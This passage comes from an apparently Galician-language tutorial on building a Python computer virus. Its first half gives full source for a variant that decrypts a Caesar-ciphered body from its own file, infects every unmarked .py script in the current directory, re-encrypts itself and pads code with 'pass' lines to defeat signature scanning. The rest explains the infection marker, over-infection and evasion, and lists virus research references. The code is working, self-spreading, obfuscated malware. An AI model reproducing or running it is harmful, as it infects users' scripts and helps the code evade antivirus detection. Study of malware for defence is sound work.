            texto_descifrado += chr((ord(caracter) - clave - 65) % 26 + 65)
        elif caracter.islower():
            pass
            pass
            pass
            texto_descifrado += chr((ord(caracter) - clave - 97) % 26 + 97)
        else:
            texto_descifrado += caracter
    pass
    return texto_descifrado


import sys
portador = open(sys.argv[0], "r")
texto_portador = portador.read()
portador.close()
parte_sin_cifrar = texto_portador[texto_portador.find("def calcula_clave"):texto_portador.find("def calcula_clave")+650]
clave = calcula_clave(texto_portador)
texto_descifrado = descifra("""wxy vbykt(mxqmh, vetox):
    mxqmh_vbyktwh = ""
    yhk vtktvmxk bg mxqmh:
        by vtktvmxk.blniixk():
            mxqmh_vbyktwh += vak((hkw(vtktvmxk) + vetox - 65) % 26 + 65)
        xeby vtktvmxk.blehpxk():
            mxqmh_vbyktwh += vak((hkw(vtktvmxk) + vetox - 97) % 26 + 97)
        xelx:
            mxqmh_vbyktwh += vtktvmxk
    kxmnkg mxqmh_vbyktwh


wxy uhkkt_itll(vhwbzh):
    vhwbzh_lxg_itll = []
    yhk ebgat bg vhwbzh.liebm(vak(10)):
        by ghm "itll" bg ebgat:
            vhwbzh_lxg_itll.tiixgw(ebgat)
    kxmnkg vak(10).chbg(vhwbzh_lxg_itll)


wxy vtevnet_mtunetvbhg(vhwbzh, ihlbvbhg):
    by "xelx" bg vhwbzh[ihlbvbhg] hk "xeby" bg vhwbzh[ihlbvbhg]:
        kxmnkg exg(vhwbzh[ihlbvbhg]) - exg(vhwbzh[ihlbvbhg].elmkbi()) + 4
    kxmnkg exg(vhwbzh[ihlbvbhg]) - exg(vhwbzh[ihlbvbhg].elmkbi())


wxy xgztwx_itll(vhwbzh):
    bfihkm ktgwhf
    ebgatl = vhwbzh.liebm(vak(10))
    yhk b bg ktgzx(10):
        by ktgwhf.ktgwhf() > 0.75:
            ihlbvbhg_bglxvbhg = ktgwhf.ktgwbgm(1, exg(ebgatl) - 1)
            ebgatl.bglxkm(ihlbvbhg_bglxvbhg, " " * vtevnet_mtunetvbhg(ebgatl, ihlbvbhg_bglxvbhg) + "itll")
    kxmnkg vak(10).chbg(ebgatl)


wxy fhwbybvt(vhwbzh):
    ghoh_vhwbzh = []
    lxitktwhk = vak(10) + vak(10) + vak(10)
    yngvbhgl = vhwbzh.liebm(lxitktwhk)
    yhk mxqmh bg yngvbhgl:
        by mxqmh:
            vhwbzh_lxg_itll = uhkkt_itll(mxqmh)
            vhwbzh_vhg_itll = xgztwx_itll(vhwbzh_lxg_itll)
            ghoh_vhwbzh.tiixgw(vhwbzh_vhg_itll)
        xelx:
            ghoh_vhwbzh.tiixgw(mxqmh)
    kxmnkg lxitktwhk.chbg(ghoh_vhwbzh)


wxy bgyxvmtk(obknl):
    bfihkm hl
    yhk tkjnboh bg hl.eblmwbk("."):
        by tkjnboh.xgwlpbma(".ir"):
            lvkbim = hixg(tkjnboh, "k+")
            mxqmh_lvkbim = lvkbim.kxtw()
            by "wxy vtevnet_vetox" ghm bg mxqmh_lvkbim:
                itkmx_xg_vetkh = obknl[:obknl.ybgw("wxy vbykt")]
                itkmx_t_vbyktk = obknl[obknl.ybgw("wxy vbykt"):]
                itkmx_xg_vetkh_fhwbybvtwt = fhwbybvt(itkmx_xg_vetkh)
                vetox = vtevnet_vetox(mxqmh_lvkbim)
                itkmx_vkbyktwt = vbykt(itkmx_t_vbyktk, vetox)
                lvkbim.pkbmx(itkmx_xg_vetkh_fhwbybvtwt)
                wxlvkbyktwhk = "bfihkm lrl" + vak(10) + "ihkmtwhk = hixg(lrl.tkzo[0], " + vak(34) + "k" + vak(34) + ")" + vak(10) + "mxqmh_ihkmtwhk = ihkmtwhk.kxtw()" + vak(10) + "ihkmtwhk.vehlx()" + vak(10) + "itkmx_lbg_vbyktk = mxqmh_ihkmtwhk[mxqmh_ihkmtwhk.ybgw(" + vak(34) + "wxy vtevnet_vetox" + vak(34) + "):mxqmh_ihkmtwhk.ybgw(" + vak(34) + "wxy vtevnet_vetox" + vak(34) + ")+" + lmk(exg(itkmx_xg_vetkh_fhwbybvtwt)) + "]" + vak(10) + "vetox = vtevnet_vetox(mxqmh_ihkmtwhk)" + vak(10) + "mxqmh_wxlvbyktwh = wxlvbykt(" + vak(34) + vak(34) + vak(34) + itkmx_vkbyktwt + vak(34) + vak(34) + vak(34) + ", vetox)" + vak(10) + "xqxv(mxqmh_wxlvbyktwh)" + vak(10) + "xqxvnmt(itkmx_lbg_vbyktk + mxqmh_wxlvbyktwh)"
                lvkbim.pkbmx(wxlvkbyktwhk)
            lvkbim.vehlx()


wxy itrehtw():
    ikbgm("Ynvaxl bgyxvmtwh")


wxy xqxvnmt(obknl):
    bgyxvmtk(obknl)
    itrehtw()""", clave)
exec(texto_descifrado)
executa(parte_sin_cifrar + texto_descifrado)
```

Finalmente, hai que recordar que esta variante do virus coma a anterior, infectan aos arquivos que non conteñan a cadea 
de caracteres “def calcula_clave”, polo que se nun programa ou script lexítimo existe esa cadea de caracteres, non será 
infectado.

# A ter en conta
## Discriminación de arquivos
Nas dúas últimas variantes do virus, sucede que á hora de ver se un arquivo está previamente infectado, comprobase se 
contén a cadea de caracteres “def calcula_clave”. Cando un virus utiliza unha forma de detectarse a si mesmo, permite 
que os analistas saiban esta mesma información, polo cal van a saber como detectar se un arquivo pode estar infectado 
ou non.

Por outra banda, se o virus non ten este mecanismo, pode ter problemas de sobreinfección. Isto é que o virus pode 
infectar varias veces o mesmo arquivo. A sobreinfección dun ou varios arquivos desemboca en que o usuario perciba un 
peor funcionamento á hora de executar un programa (ao fin e ao cabo, se se executa un programa infectado varias veces, 
tardará en realizar a funcionalidade lexítima xa que tamén se executará o código de varias infeccións), xunto cunha 
perda de espazo na memoria secundaria. Esta falta de rendemento e espazo fará que o usuario pense que algo vai mal, 
facendo que leve a reparar o computador e por conseguinte se pare a infección.

A forma na que o virus detectará se un arquivo está infectado ou non é moi importante á hora de crealo, xa que 
determinará a propia virulencia deste, polo que sempre que se desenvolva un virus hai que ter esta cuestión presente.

## Proteccións utilizadas
As proteccións utilizadas (cifrado de código e inserción de “pass”) están encamiñadas a evadir a detección por 
sinatura. Se se aplica unha técnica de detección mediante unha análise heurística ou análise por comportamento 
terminarase descubrindo que este programa é un virus.

Hai que aclarar que cando se ofusca un código nunha linguaxe compilada, cífranse as instrucións en ensamblador, polo 
que a implantación desta técnica distará do que se propón aquí.

## Linguaxe
Normalmente os virus (ou calquera tipo de malware) constrúense en linguaxes compiladas para evitar dependencias 
externas. O uso de Python reduce a capacidade de infección do virus creado, xa que só será efectivo en computadoras que 
teñan a linguaxe instalada e coa versión correcta.

# Conclusións
Nesta publicación viuse como funciona un virus xunto con algún dos seus mecanismos de defensa, así e todo este proceso 
ten máis complexidade da explicada, xa que neste campo hai moitas máis formas de infección e proteccións.

Quizais nun futuro se aborden en Hackliza outros temas coma a creación dun verme, o funcionamento dun cavity ou dun 
rookit, pero polo de agora haberá que agardar.

# Referencias
Filiol, E. (2004). _Computer viruses: from theory to application_ (1st ed.). Springer

Szor, P. (2005). _The Art of Computer Virus Researchand Defense_ (1st ed.). Addison Wesley Professional

[Writing Viruses for Fun, not Profit](https://www.youtube.com/watch?v=2Ra1CCG8Guo)

[Computer Virus Strategies and Detection Methods](https://www.emis.de/journals/IJOPCM/files/IJOPCM(vol.1.2.3.S.8).pdf)

[Malware development part 1](https://0xpat.github.io/Malware_development_part_1/)
